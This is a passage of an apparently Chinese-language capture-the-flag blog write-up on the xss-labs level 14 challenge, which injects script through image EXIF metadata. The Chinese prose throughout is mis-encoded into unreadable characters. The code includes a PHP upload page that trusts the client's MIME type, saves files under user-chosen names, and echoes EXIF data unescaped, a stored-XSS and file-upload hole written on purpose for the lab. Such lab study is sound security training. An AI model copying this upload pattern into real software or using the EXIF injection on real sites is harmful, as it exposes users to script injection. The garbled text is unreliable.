tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVQI12P4//8/AAX+Av7czFnnAAAAAElFTkSuQmCC<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>preconnect<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>target<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">opacity</span><span class="token punctuation">:</span> 0</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span>park <span class="token operator">=</span> <span class="token string">"eyJ1dWlkIjoiYmMyMDJmMTktMTQzZC00YjdkLWIwZWMtMzRjN2RhOWJiYWZmIiwicGFnZV90aW1lIjoxNzM4OTA2MTQzLCJwYWdlX3VybCI6Imh0dHA6Ly93dzEuZXhpZnZpZXdlci5vcmcvIiwicGFnZV9tZXRob2QiOiJHRVQiLCJwYWdlX3JlcXVlc3QiOnt9LCJwYWdlX2hlYWRlcnMiOnt9LCJob3N0Ijoid3cxLmV4aWZ2aWV3ZXIub3JnIiwiaXAiOiI0OS45MC4yNi42MSJ9Cg=="</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/bJQhiZKST.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ‰ä¸€äº›base64çš„æ•°æ®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANDrp2lz7AOmADaN8tA50LsWcjLFyQFcb/P2Txc58oYOeILb3vBw7J6f4pamkAQVSQuqYsKx3YzdUHCvbVZvFUsCAwEAAQ<span class="token operator">==</span>_J6X9s0IorRD+0hqMUWIoDabixD/nOIsKZHj78GOfvQQg8+RdLBALRSO/DHhuUb+Gy20sAvzDn9qKgr8xI5T7cA<span class="token operator">==</span>è§£ç å¤±è´¥ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVQI12P4//8/AAX+Av7czFnnAAAAAElFTkSuQmCC<span class="token punctuation">\</span>x89PNG<span class="token punctuation">\</span>x1a<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00IHDR<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x01<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x01<span class="token punctuation">\</span>x08<span class="token punctuation">\</span>x02<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x90wS<span class="token punctuation">\</span>xde<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00IDAT<span class="token punctuation">\</span>x08<span class="token punctuation">\</span>xd7c<span class="token punctuation">\</span>xf8<span class="token punctuation">\</span>xff<span class="token punctuation">\</span>xff?<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x05<span class="token punctuation">\</span>xfe<span class="token punctuation">\</span>x02<span class="token punctuation">\</span>xfe<span class="token punctuation">\</span>xdc<span class="token punctuation">\</span>xccY<span class="token punctuation">\</span>xe7<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00<span class="token punctuation">\</span>x00IEND<span class="token punctuation">\</span>xaeB`<span class="token punctuation">\</span>x82<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">eyJ1dWlkIjoiYmMyMDJmMTktMTQzZC00YjdkLWIwZWMtMzRjN2RhOWJiYWZmIiwicGFnZV90aW1lIjoxNzM4OTA2MTQzLCJwYWdlX3VybCI6Imh0dHA6Ly93dzEuZXhpZnZpZXdlci5vcmcvIiwicGFnZV9tZXRob2QiOiJHRVQiLCJwYWdlX3JlcXVlc3QiOnt9LCJwYWdlX2hlYWRlcnMiOnt9LCJob3N0Ijoid3cxLmV4aWZ2aWV3ZXIub3JnIiwiaXAiOiI0OS45MC4yNi42MSJ9Cg</span><span class="token operator">==</span><span class="token punctuation">{</span><span class="token string">"uuid"</span><span class="token builtin class-name">:</span><span class="token string">"bc202f19-143d-4b7d-b0ec-34c7da9bbaff"</span>,<span class="token string">"page_time"</span>:1738906143,<span class="token string">"page_url"</span><span class="token builtin class-name">:</span><span class="token string">"http://ww1.exifviewer.org/"</span>,<span class="token string">"page_method"</span><span class="token builtin class-name">:</span><span class="token string">"GET"</span>,<span class="token string">"page_request"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token string">"page_headers"</span>:<span class="token punctuation">{</span><span class="token punctuation">}</span>,<span class="token string">"host"</span><span class="token builtin class-name">:</span><span class="token string">"ww1.exifviewer.org"</span>,<span class="token string">"ip"</span><span class="token builtin class-name">:</span><span class="token string">"49.90.26.61"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›®å‰æ‰¾ä¸åˆ°ä»€ä¹ˆæ€è·¯ã€‚</p><h3 id="14-2-2-ä»£ç å®¡è®¡"><a href="#14-2-2-ä»£ç å®¡è®¡" class="headerlink" title="14.2.2 ä»£ç å®¡è®¡"></a>14.2.2 ä»£ç å®¡è®¡</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string double-quoted-string">"content-type"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"text/html;charset=utf-8"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>æ¬¢è¿æ¥åˆ°level14<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span>h1 align<span class="token operator">=</span>center<span class="token operator">&gt;</span>æ¬¢è¿æ¥åˆ°level14<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span><span class="token operator">&lt;</span>center<span class="token operator">&gt;</span><span class="token operator">&lt;</span>iframe name<span class="token operator">=</span><span class="token string double-quoted-string">"leftframe"</span> marginwidth<span class="token operator">=</span><span class="token number">10</span> marginheight<span class="token operator">=</span><span class="token number">10</span> src<span class="token operator">=</span><span class="token string double-quoted-string">"http://www.exifviewer.org/"</span> frameborder<span class="token operator">=</span>no width<span class="token operator">=</span><span class="token string double-quoted-string">"80%"</span> scrolling<span class="token operator">=</span><span class="token string double-quoted-string">"no"</span> height<span class="token operator">=</span><span class="token number">80</span><span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>center<span class="token operator">&gt;</span><span class="token operator">&lt;</span>center<span class="token operator">&gt;</span>è¿™å…³æˆåŠŸåä¸ä¼šè‡ªåŠ¨è·³è½¬ã€‚æˆåŠŸè€…<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token operator">/</span>xss<span class="token operator">/</span>level15<span class="token operator">.</span>php<span class="token operator">?</span>src<span class="token operator">=</span><span class="token number">1.</span>gif<span class="token operator">&gt;</span>ç‚¹æˆ‘è¿›level15<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>center<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="14-2-3-å…³å¡è°ƒæ•´"><a href="#14-2-3-å…³å¡è°ƒæ•´" class="headerlink" title="14.2.3 å…³å¡è°ƒæ•´"></a>14.2.3 å…³å¡è°ƒæ•´</h3><p>å…³å¡æœ¬èº«çš„é—®é¢˜å¯¼è‡´é¡µé¢æ²¡æœ‰å±•ç¤ºå‡ºæ¥ï¼Œéœ€è¦åšä¸€äº›é…ç½®ã€‚</p><p>ç‚¹å‡»ç½‘ç«™è®¾ç½®ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2013.53.20.png" style="zoom:50%;"><p>å±è”½å¹¿å‘Šå…³é—­ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2013.52.58.png" style="zoom:50%;"><p>æŠŠæ‰€æœ‰å±è”½éƒ½æ”¹æˆäº†å…è®¸ï¼Œè¿˜æ˜¯ä¸è¡Œã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2013.58.20.png" style="zoom:50%;"><p>æ¢ä¸ªæµè§ˆå™¨ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2014.01.24.png" alt="ç«ç‹æµè§ˆå™¨è¿™ä¸€å…³å¯ä»¥æ­£å¸¸æ˜¾ç¤º" style="zoom:30%;"><p>ç«ç‹æµè§ˆå™¨å¯ä»¥æ­£å¸¸æ˜¾ç¤ºã€‚ä½†æ˜¾ç¤ºè¿™ä¸ªå†…å®¹å…¶å®è¿˜æ˜¯æŒ‚æ‰äº†ã€‚</p><h2 id="14-3-å…³å¡é‡æ–°é…ç½®"><a href="#14-3-å…³å¡é‡æ–°é…ç½®" class="headerlink" title="14.3 å…³å¡é‡æ–°é…ç½®"></a>14.3 å…³å¡é‡æ–°é…ç½®</h2><p>åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªindex.phpæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token keyword">echo</span> <span class="token string single-quoted-string">'   &lt;html&gt;    &lt;head&gt;    &lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;    &lt;title&gt;æ¬¢è¿æ¥åˆ°level14&lt;/title&gt;    &lt;/head&gt;    &lt;center&gt;   &lt;form action="./index.php" method=POST enctype=multipart/form-data&gt;   &lt;label for=file&gt;æ–‡ä»¶åï¼š&lt;/label&gt;&lt;input type=file name=file id=file&gt;&lt;br&gt;   &lt;input type=submit name=submit value=æäº¤&gt;&lt;/form&gt;&lt;/center&gt;&lt;/html&gt;'</span><span class="token punctuation">;</span>     <span class="token keyword">try</span><span class="token punctuation">{</span>        <span class="token comment">// å…è®¸ä¸Šä¼ çš„å›¾ç‰‡åç¼€</span>        <span class="token variable">$allowedExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// è·å–æ–‡ä»¶åç¼€å</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/gif"</span><span class="token punctuation">)</span>        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/jpeg"</span><span class="token punctuation">)</span>        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/jpg"</span><span class="token punctuation">)</span>        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/pjpeg"</span><span class="token punctuation">)</span>        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/x-png"</span><span class="token punctuation">)</span>        <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>   <span class="token comment">// å°äº 200 kb</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowedExts</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"é”™è¯¯ï¼š: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä¸Šä¼ æ–‡ä»¶å: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"éæ³•çš„æ–‡ä»¶æ ¼å¼"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token variable">$exif</span> <span class="token operator">=</span> <span class="token function">exif_read_data</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h4&gt;[ "</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">" ]çš„EXIFä¿¡æ¯:&lt;/h4&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$exif</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$section</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$section</span> <span class="token keyword">as</span> <span class="token variable">$name</span> <span class="token operator">=&gt;</span> <span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span>.<span class="token interpolation"><span class="token variable">$name</span></span>: <span class="token interpolation"><span class="token variable">$val</span></span>&lt;br /&gt;\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2014.23.31.png" style="zoom:50%;"><p>ä¿®æ”¹<code>level14.php</code>çš„æºä»£ç ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2014.26.11.png" style="zoom:50%;"><p>å…³å¡æ­£å¸¸æ˜¾ç¤ºï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2014.26.46.png" style="zoom:50%;"><p>ä¸Šä¼ ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Fatal error: Call to undefined <span class="token keyword">function</span> exif_read_data<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> E:<span class="token punctuation">\</span>phpstudy_pro<span class="token punctuation">\</span>WWW<span class="token punctuation">\</span>index.php on line <span class="token number">43</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2014.30.31.png" style="zoom:50%;"><p>éœ€è¦æ‰“å¼€php_exifæ‰©å±•ã€‚å†æ¬¡æµ‹è¯•ï¼š</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2014.31.33.png" style="zoom:50%;"><p>æˆåŠŸæ‰“å°å‡ºå›¾ç‰‡çš„EXIFä¿¡æ¯ã€‚</p><blockquote><h4 id="ä»€ä¹ˆæ˜¯EXIFä¿¡æ¯ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯EXIFä¿¡æ¯ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯EXIFä¿¡æ¯ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯EXIFä¿¡æ¯ï¼Ÿ</h4><p>EXIFï¼ˆExchangeable Image File Formatï¼Œå¯äº¤æ¢å›¾åƒæ–‡ä»¶æ ¼å¼ï¼‰æ˜¯ä¸€ç§æ ‡å‡†ï¼Œç”¨äºåœ¨æ•°å­—å›¾åƒæ–‡ä»¶ä¸­å­˜å‚¨é™„åŠ ä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯é€šå¸¸åŒ…æ‹¬æ‹æ‘„ç…§ç‰‡æ—¶çš„ç›¸æœºè®¾ç½®ã€æ—¶é—´å’Œæ—¥æœŸã€åœ°ç†ä½ç½®ç­‰å…ƒæ•°æ®ã€‚EXIFä¿¡æ¯ä½¿å¾—å›¾åƒæ–‡ä»¶èƒ½å¤Ÿæºå¸¦æ›´å¤šçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œæœ‰åŠ©äºäº†è§£ç…§ç‰‡çš„æ‹æ‘„æ¡ä»¶å’Œç¯å¢ƒã€‚</p><p><code>exif_read_data()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºä»å›¾åƒæ–‡ä»¶ä¸­è¯»å– EXIF å¤´ä¿¡æ¯ï¼Œä»è€Œå¯ä»¥è·å–æ•°ç ç›¸æœºç”Ÿæˆçš„å…ƒæ•°æ®ã€‚è¿™äº›å…ƒæ•°æ®é€šå¸¸åŒ…æ‹¬æ‹æ‘„ç…§ç‰‡æ—¶çš„ç›¸æœºè®¾ç½®ã€æ—¶é—´å’Œæ—¥æœŸã€åœ°ç†ä½ç½®ç­‰ä¿¡æ¯ã€‚è¯¥å‡½æ•°ä¸»è¦é€‚ç”¨äº JPEG æˆ– TIFF æ ¼å¼çš„å›¾åƒæ–‡ä»¶ã€‚</p></blockquote><h2 id="14-4-è§£é¢˜"><a href="#14-4-è§£é¢˜" class="headerlink" title="14.4 è§£é¢˜"></a>14.4 è§£é¢˜</h2><ul><li>æŸ¥çœ‹ç½‘é¡µçš„æºä»£ç ï¼š</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.32.11.png" style="zoom:50%;"><ul><li>é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„EXIFä¿¡æ¯ä¸ºXSSè„šæœ¬</li></ul><blockquote><h4 id="æŸ¥çœ‹exifä¿¡æ¯"><a href="#æŸ¥çœ‹exifä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹exifä¿¡æ¯"></a>æŸ¥çœ‹exifä¿¡æ¯</h4><p>1ï¼‰exiftool</p><p>å®‰è£…exiftoolï¼Œ<code>brew install exiftool</code>ã€‚</p><p>æŸ¥çœ‹å›¾ç‰‡çš„exifä¿¡æ¯ï¼Œ<code>exiftool /path/to/your/image.jpg</code></p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.35.55.png" style="zoom:50%;"><p>2ï¼‰å³é”®<code>æ˜¾ç¤ºé¢„è§ˆé€‰é¡¹</code></p><p>æˆ–è€…å³é”®<code>æ˜¾ç¤ºé¢„è§ˆé€‰é¡¹</code></p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.39.38.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.40.39.png" style="zoom:40%;"><p>3ï¼‰exifviewerå·¥å…·æŸ¥çœ‹å’Œç¼–è¾‘</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.43.19.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.45.49.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.47.48.png" style="zoom:50%;"><p>4ï¼‰ä½¿ç”¨windowså³é”®å›¾ç‰‡å±æ€§è¿›è¡ŒæŸ¥çœ‹å’Œä¿®æ”¹ï¼ˆæ¨èâœ…ï¼‰</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.53.14.png" style="zoom:50%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.53.59.png" style="zoom:30%;"><p>å¯ä»¥çœ‹åˆ°exifä¿¡æ¯å·²ç»è¢«ä¿®æ”¹ã€‚</p></blockquote><ul><li>ä¸Šä¼ ç¯¡æ”¹è¿‡exifä¿¡æ¯çš„å›¾ç‰‡</li></ul><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.53.59.png" style="zoom:30%;"><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.55.13.png" style="zoom:50%;"><p>æˆåŠŸè§¦å‘xssä»£ç æ‰§è¡Œã€‚</p><p>é€šè¿‡æŠ“åŒ…åˆ†æå¯ä»¥çœ‹åˆ°ï¼Œxss POCè„šæœ¬æˆåŠŸæ¸²æŸ“å¹¶è¢«æ‰§è¡Œã€‚</p><img src="/2025/02/06/ctf-shi-zhan/web-xss-labs/%E6%88%AA%E5%B1%8F2025-02-07%2015.57.06.png" style="zoom:50%;"><h2 id="å°ç»“-13"><a 